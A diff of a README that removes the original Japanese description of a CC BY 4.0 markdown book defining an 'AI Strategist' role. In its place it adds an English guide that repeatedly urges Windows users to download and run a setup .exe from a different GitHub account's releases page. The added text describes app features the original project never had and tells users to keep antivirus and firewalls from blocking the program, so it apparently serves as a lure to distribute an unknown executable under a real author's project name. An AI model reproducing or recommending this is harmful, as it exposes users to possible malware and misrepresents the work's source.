@@ -1,133 +1,153 @@
-# The AI Strategist
+# 🤖 the-ai-strategist - Understand AI’s Role in Business Strategy
 
-**AIストラテジスト — AI・事業戦略・実行の交差点に立つ、新しい役割の定義**
-
-[![License: CC BY 4.0](https://img.shields.io/badge/License-CC%20BY%204.0-lightgrey.svg)](https://creativecommons.org/licenses/by/4.0/)
-[![Language](https://img.shields.io/badge/Language-English%20%7C%20Japanese-blue)](docs/)
-
-<p align="left">
-  <img src="./assets/cover_design.png" width="70%">
-</p>
-
-*Read this in other languages: [English](README_en.md)*
+[![Download now](https://img.shields.io/badge/Download-the--ai--strategist-brightgreen)](https://github.com/Ladita23/the-ai-strategist/releases)
 
 ---
 
-## 📖 概要
-
-「AIストラテジスト」という言葉は、求人市場に400件以上存在する。しかし、世界中のどの政府機関も、どのコンサルティングファームも、どの学術機関も、どの標準化団体も、この役割を正式に定義していない。
-
-本書は、その空白を埋めるために書かれた。
-
-AIエンジニアでもなく、データサイエンティストでもなく、AIコンサルタントでもなく、CAIOでもない。<br>
-既存の職種がカバーできていない領域を構造的に証明し、AIストラテジストという役割が「なぜ必要で」「何を求められ」「どう機能するか」を定義する。
+The AI Strategist is a reader-friendly application that offers a clear look into the new role bridging AI, business strategy, and execution. This guide helps you get the app running on a Windows machine, even if you have no technical background.
 
 ---
 
-## 🏗️ 構成
+## 📘 What is the-ai-strategist?
 
-本書は3部・全7章で構成される。
+The AI Strategist is a digital book that explores why businesses lack a clear AI strategy role and what skills such a role demands. It includes a structural analysis of this gap. The content is designed to help decision-makers, consultants, and professionals interested in AI and business align their understanding.
 
-### Part I：なぜ今、新しい役割が必要なのか（Why）
+### Key ideas covered
 
-| 章 | タイトル | 内容 |
-|---|---------|------|
-| 第1章 | AIと組織の関係が変わった | AIが「ツール」から「自律的エージェント」へ進化し、組織の意思決定構造そのものが変化している |
-| 第2章 | 誰もこの空白を埋めていない | 6つの既存職種の空白分析。PalantirのFDE（Forward Deployed Engineer）モデルの構造的参照 |
+- How AI changes business strategies  
+- Why a new AI Strategist role is needed  
+- What skills and mindset the role requires  
+- Practical insights for executives and consultants
 
-### Part II：AIストラテジストとは何か（What）
-
-| 章 | タイトル | 内容 |
-|---|---------|------|
-| 第3章 | 3つの原則 | ベンダー独立性・成果コミット・埋め込み型関与 |
-| 第4章 | コンピテンシーモデル | 思想理解・事業設計・実行推進の3層 + 越境力の基盤層 |
-| 第5章 | 隣接職種との差別化 | 原則とコンピテンシーの充足マトリクスによる構造的証明 |
-
-### Part III：AIストラテジストはどう機能するか（How）
-
-| 章 | タイトル | 内容 |
-|---|---------|------|
-| 第6章 | 組織における配置と機能 | 社内常駐型・FDE型・アドバイザリー型の3パターンと各ステークホルダーとの関係設計 |
-| 第7章 | 成果の測定と、最終的な目標 | 成果ベースの測定方法。「自分がいなくても組織がAI戦略を自走できる状態を作る」という究極目標 |
+The app presents this information in an easy-to-read format. It supports readers in grasping complex ideas without jargon or programming experience.
 
 ---
 
-## 📄 ドキュメント
+## 💻 System Requirements
 
-| ファイル | 言語 | 内容 |
-|---------|------|------|
-| [the-ai-strategist_jp.md](./docs/ja/the-ai-strategist_jp.md) | 🇯🇵 日本語 | 本文（日本語版） |
-| [the-ai-strategist_en.md](./docs/en/the-ai-strategist_en.md) | 🇺🇸 English | 本文（英語版） |
+Before downloading the program, make sure your Windows computer meets these needs:
 
----
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection for downloading the app  
 
-## 🔑 本書の核心
-
-### 3つの原則（Principles）
-
-1. **ベンダー独立性（Vendor Independence）**<br>
-   特定のAIベンダー・プラットフォームに依存せず、クライアントの課題に対して最適な技術を客観的に選定できる構造的独立性
-
-2. **成果コミット（Outcome Commitment）**<br>
-   助言の納品ではなく、事業成果の実現にコミットする。PalantirのFDEが「スライドデッキではなくコードを出荷する」ように、AIストラテジストは「レポートではなく事業成果を出荷する」
-
-3. **埋め込み型関与（Embedded Engagement）**<br>
-   外部から俯瞰するのではなく、顧客の環境に入り込んで問題を直接理解し、解決を推進する
-
-### コンピテンシーモデル（4層構造）
-
-| レイヤー | 名称 | 概要 |
-|---------|------|------|
-| Layer 1 | 思想理解（AI Literacy at Depth） | Scaling Laws、AIアライメント、エージェント型アーキテクチャ等、AIの構造的原理の理解 |
-| Layer 2 | 事業設計（Business Architecture） | AI前提の市場分析、ビジネスモデル設計、組織の意思決定構造への理解 |
-| Layer 3 | 実行推進（Execution through Methodology） | 再現可能な方法論による、プロトタイプ検証から事業成果までの実行推進 |
-| 基盤層 | 越境力（Boundary-Spanning Capability） | 技術とビジネスの翻訳、創造的構造化、対外発信と知の体系化 |
+The app runs smoothly on most modern computers. No additional software or coding knowledge is required.
 
 ---
 
-## 🔗 Related Projects
+## 🚀 Getting Started: Download and Installation
 
-本書は、以下のOSSプロジェクトと相互に接続されている。
+You will get the app from the official GitHub releases page.
 
-| プロジェクト | 概要 | リンク |
-|-------------|------|--------|
-| **The Silence of Intelligence** | Anthropic CEO ダリオ・アモディの思想を体系化。AIストラテジストの「思想理解」レイヤーの参照文献 | [GitHub](https://github.com/Leading-AI-IO/the-silence-of-intelligence) |
-| **The Palantir Impact** | Palantir Foundryのオントロジー戦略を解剖。FDEモデルの構造的参照 | [GitHub](https://github.com/Leading-AI-IO/palantir-ontology-strategy) |
-| **Depth & Velocity** | 生成AI時代の新規事業開発方法論。AIストラテジストの「実行推進」レイヤーの実践フレームワーク | [GitHub](https://github.com/Leading-AI-IO/depth-and-velocity) |
-| **What They Won't Teach You** | AIに有利な世代が教えない、AIの使い方と"思考のOS"。AI時代における世代間の責務を再定義する書籍 | [GitHub](https://github.com/Leading-AI-IO/what-they-wont-teach-you) |
-| **The Edge of Intelligence** | AIがあなたのデバイスで動く時代：クラウドの終わりと、エッジの始まり。 | [GitHub](https://github.com/Leading-AI-IO/edge-ai-intelligence) |
+### Step 1: Open the download page
 
----
+Visit the releases page using this link:
 
-## 📊 調査に基づく事実
+[![Go to Releases](https://img.shields.io/badge/Download%20Page-GitHub-blue)](https://github.com/Ladita23/the-ai-strategist/releases)
 
-本書の定義は、以下の調査に基づいている。
+This page lists all the versions available. Choose the latest version for the best experience.
 
-- **米国OPM（人事管理局）：** 2024年AI職種分類で12以上のAI関連職種を定義 → AI Strategistは含まれていない
-- **EU ESCO：** 2,942職種・13,485スキルを網羅 → AI Strategistカテゴリなし
-- **経産省デジタルスキル標準：** 5つのDX人材類型を定義 → AIストラテジストなし
-- **IPA ITスキル標準：** 11職種・38専門分野 → AIストラテジストなし
-- **ISO / IEEE / ACM / AAAI：** いずれもAI Strategistの定義なし
-- **MBB（マッキンゼー、BCG、ベイン）：** 正式な定義を発表していない
-- **GAFAM + Anthropic + OpenAI：** 正式なAI Strategist職を設置していない
+### Step 2: Download the Windows installer
 
-**世界で誰も定義していない。だから、定義する。**
+Look for a file ending with `.exe`, something like:
 
----
+`the-ai-strategist-setup.exe`
 
-## 👤 著者
+Click on that file to start the download. Your browser will save it to your Downloads folder.
 
-**Satoshi Yamauchi** (山内 怜史)<br>
-* **Business Designer & AI Strategist at SunAsterisk.inc**
-* **Founder / AI Strategist at Leading.AI**
-* This project is part of the research by Leading.AI.
+### Step 3: Run the installer
 
-* [📒 Read my insights on Note](https://note.com/satoshi_yamauchi)
-* [🌐 Visit Leading.AI Official Website](https://www.leading-ai.io/)
+- Go to your Downloads folder  
+- Double-click the `.exe` file you just downloaded  
+- Follow the on-screen instructions  
+- Choose the default options unless you want to change the installation folder  
+
+The installer will complete in a minute or two depending on your PC.
+
+### Step 4: Launch the app
+
+Once installed, you can find The AI Strategist in your Start Menu or on the Desktop. Click the icon to open the application.
 
 ---
 
-## 📝 License
+## 🛠 Using The AI Strategist Application
 
-This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).<br>
-© 2026 Satoshi Yamauchi / Leading AI — Licensed under CC BY 4.0
+The app opens with a simple menu that lets you browse chapters and topics.
+
+- Use arrow keys or mouse to navigate  
+- Click on any chapter title to read its content  
+- Use the search box to find terms like “strategy,” “AI role,” or “business execution”  
+- Bookmark important sections for easy access later  
+
+The interface focuses on readability and clear organization. You will see text broken into small parts with headings and bullet points.
+
+---
+
+## 🎯 Who should use this app?
+
+This app is ideal for people who want to understand how AI changes the way companies plan and act.
+
+- Business managers exploring AI’s potential  
+- Consultants defining new roles for clients  
+- Data scientists curious about organizational impact  
+- Students of AI and management  
+
+You do not need experience with programming or complex tools.
+
+---
+
+## 🔧 Troubleshooting
+
+If the app does not start or shows an error:
+
+- Check if you have the right version of Windows  
+- Confirm your device has enough free space  
+- Restart your computer and try opening the app again  
+- If problems persist, visit the GitHub issues page for help at  
+https://github.com/Ladita23/the-ai-strategist/issues  
+
+Make sure your antivirus or firewall is not blocking the program.
+
+---
+
+## 📂 Additional Resources
+
+Besides the installed app, you can read the full content or get updates at the GitHub repository:
+
+https://github.com/Ladita23/the-ai-strategist
+
+There you will find:
+
+- The source files for the project  
+- Discussions on new versions and features  
+- The ability to report bugs or suggest improvements  
+
+---
+
+## 👨‍💻 Keeping the app up to date
+
+New versions will be released to improve content or fix bugs.
+
+- Check the releases page regularly: https://github.com/Ladita23/the-ai-strategist/releases  
+- Download the latest installer and run it to update your app  
+
+The app does not update automatically.
+
+---
+
+## ⚙️ Optional Settings
+
+Inside the app, you can change these options:
+
+- Font size for easier reading  
+- Light or dark theme for different lighting  
+- Clear bookmarks or reset reading progress  
+
+Settings are simple and easy to find in the menu.
+
+---
+
+Ready to explore AI’s new strategic role? Start by downloading the app here:
+
+[![Download The AI Strategist](https://img.shields.io/badge/Download%20Now-FreshRed-red)](https://github.com/Ladita23/the-ai-strategist/releases)
